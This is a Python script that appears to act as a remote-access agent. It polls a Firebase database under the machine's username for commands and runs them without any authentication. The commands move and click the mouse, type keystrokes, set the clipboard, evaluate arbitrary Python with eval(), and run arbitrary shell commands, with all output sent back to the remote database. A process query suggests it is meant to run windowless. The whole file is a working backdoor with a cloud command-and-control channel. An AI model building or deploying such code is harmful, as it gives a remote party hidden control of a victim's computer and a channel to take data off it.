# ser.py

import firebase_admin
from firebase_admin import credentials, db
import pyautogui
import time
import pyperclip
import os
import subprocess

uname=os.environ["username"]

cred = credentials.Certificate('tempest.json')
firebase_admin.initialize_app(cred, {
	'databaseURL': 'https://mysamplecodetest-default-rtdb.asia-southeast1.firebasedatabase.app/'
})

def send_feedback(message):
    feedback_ref = db.reference(f'/{uname}/feedback')
    feedback_ref.push(message)





def execute_command(command):
	parts=command.split()
	try:
		if parts[0] == "moveto":
			x = int(parts[1])
			y = int(parts[2])
			move_time = float(parts[3])
			print(f"\tMoving cursor to ({x}, {y}) in {move_time} seconds.")
			send_feedback(f"Moving cursor to ({x}, {y}) in {move_time} seconds.")
			pyautogui.moveTo(x, y, duration=move_time)
			send_feedback("Cursor reached")

		elif parts[0] == "move":
			x = int(parts[1])
			y = int(parts[2])
			move_time = float(parts[3])
			print(f"\tMoving cursor to ({x}, {y}) in {move_time} seconds.")
			send_feedback(f"Moving cursor ({x}, {y}) in {move_time} seconds.")
			pyautogui.move(x, y, duration=move_time)
			send_feedback("Cursor reached")

		elif parts[0] == "dragto":
			x = int(parts[1])
			y = int(parts[2])
			move_time = float(parts[3])
			print(f"\tDragging cursor to ({x}, {y}) in {move_time} seconds.")
			send_feedback(f"Dragging cursor to ({x}, {y}) in {move_time} seconds.")
			pyautogui.dragTo(x, y, duration=move_time)
			send_feedback("Cursor reached")

		elif parts[0] == "drag":
			x = int(parts[1])
			y = int(parts[2])
			move_time = float(parts[3])
			print(f"\tDragging cursor to ({x}, {y}) in {move_time} seconds.")
			send_feedback(f"Dragging cursor ({x}, {y}) in {move_time} seconds.")
			pyautogui.drag(x, y, duration=move_time)
			send_feedback("Cursor reached")

		elif parts[0] == "click":
			if parts[-1]=='r':
				butt='right'
			elif parts[-1]=='m':
				butt='middle'
			else:
				butt='left'
			if len(parts)>2:
				X=int(parts[1])
				Y=int(parts[2])
			else:
				X,Y=None,None
			pyautogui.click(x=X,y=Y, button=butt)
			print(f"\tClicked {X}, {Y}, button: {butt}")
			send_feedback(f"Clicked {X}, {Y}, button: {butt}")

		elif parts[0] == "scroll":
			clicks=int(parts[1])
			pyautogui.scroll(clicks)
			print(f"\tScrolled {clicks} clicks")
			send_feedback(f"\tScrolled {clicks} clicks")

		elif parts[0] == "keyup":
			key=parts[1]
			pyautogui.keyUp(key)
			print(f"\tKey UP: {key}")
			send_feedback(f"\tKey UP: {key}")

		elif parts[0] == "keydown":
			key=parts[1]
			pyautogui.keyDown(key)
			print(f"\tKey DOWN: {key}")
			send_feedback(f"\tKey DOWN: {key}")

		elif parts[0] == "press":
			if len(parts)>2:
				times=int(parts[-1])
			else:
				times=1
			pyautogui.press(parts[1], presses=times)
			print(f"\tPressed {parts[1]} {times} clicks")
			send_feedback(f"\tPressed {parts[1]} {times} clicks")

		elif parts[0] == "write":
			con = " ".join(parts[1:]).replace("\\n", "\n")
			print(f"Writing:\n{con}")
			send_feedback(f"Writing:\n{con}")
			pyautogui.write(con)
			send_feedback("Done Writing.")

		elif parts[0] == "eval":
			print(f"Custom command: {command}")
			send_feedback(f"Custom command: {command}")
			eva = eval(" ".join(parts[1:]))
			send_feedback(f"Custom command done executed.\nOUT:\n{eva}")

		elif parts[0] == "copy":
			t = " ".join(parts[1:])
			pyperclip.copy(t)
			print(f"\tCopied:\n----------\n{t}\n----------")
			send_feedback(f"\tCopied:\n----------\n{t}\n----------")

		elif parts[0] == "cd":
			path = " ".join(parts[1:])
			os.chdir(path)
			print(f"Current Path: {os.getcwd()}")
			send_feedback(f"Current Path: {os.getcwd()}")

		elif parts[0] == "shell":
			cmd = " ".join(parts[1:])
			result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
			content = result.stdout + "\n" + result.stderr
			print(f"OUTPUT: \n{'-'*15}\n{content}\n{'-'*15}")
			send_feedback(f"OUTPUT: \n{'-'*15}\n{content}\n{'-'*15}")

		elif parts[0] == "get_pyw":
			cmd = "wmic process where \"name='pyw.exe'\" get ProcessId,CommandLine"
			result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
			content = result.stdout + "\n" + result.stderr
			print(f"Get_pyw:\n{cmd}\n{'-'*15}\n{content}\n{'-'*15}")
			send_feedback(f"Get_pyw:\n{cmd}\n{'-'*15}\n{content}\n{'-'*15}")

		else:
			print(f"Non existent command {command}")
			send_feedback(f"Non existent command {command}")
	except Exception as e:
		print(f"Error in parsing command {command}:\n{type(e)}\n{e}")
		send_feedback(f"Error in parsing command {command}:\n{e}")



def listen_for_commands():
	ref = db.reference(f'/{uname}/commands') 
	send_feedback(f"{uname} Active at {int(time.time())}")
	while True:
		try:
			command_data = ref.get()  # Get all commands
			if command_data:
				for key, command in command_data.items():
					print(f"\nRecieved New command: {command}")
					execute_command(command)
					ref.child(key).delete()  
		except Exception as e:
			print(type(e))
			print(e)
			time.sleep(5)

if __name__ == '__main__':
	listen_for_commands()
	
	
